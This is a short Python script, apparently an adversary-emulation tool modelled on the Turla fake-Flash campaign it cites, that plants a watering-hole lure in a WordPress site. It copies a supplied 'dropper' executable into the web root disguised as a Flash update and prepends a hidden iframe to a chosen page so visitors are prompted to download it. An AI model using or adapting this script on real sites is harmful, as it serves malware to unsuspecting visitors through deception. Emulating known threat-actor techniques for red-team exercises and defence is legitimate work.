#!/usr/bin/python

import argparse
import subprocess

parser = argparse.ArgumentParser(description='This script will copy the flash player bundle and iframe setup to your wordpress installation, and write the iframe download script to a file of your choice.')
parser.add_argument("file", help="The HTML/PHP to which you are appending the iframe")
parser.add_argument("dropper", help="The file that you would like to be downloaded by a visitor if they click the link.")
args = parser.parse_args()

# copy the appropriate files to the wordpress installation

subprocess.run(["cp", args.dropper, "/srv/www/wordpress/NotFlashVersion.exe"], check=True)
subprocess.run(["cp", "flash_update.html", "/srv/www/wordpress/flash_update.html"], check=True)

# write the iframe download script

iframe_string = """<?php echo "<!DOCTYPE html><iframe id='urgent_update' src='flash_update.html' height='275' width='1150'></iframe>";?>"""

with open(args.file, 'r') as f:
    content = f.read()
with open(args.file, 'w') as f:
    f.write(iframe_string)
    f.write("\n")
    f.write(content)

# CTI References:
# Tricking the user into running a fake flash player: https://securelist.com/the-epic-turla-operation/65545/
# Fake flash installer as vector: https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf
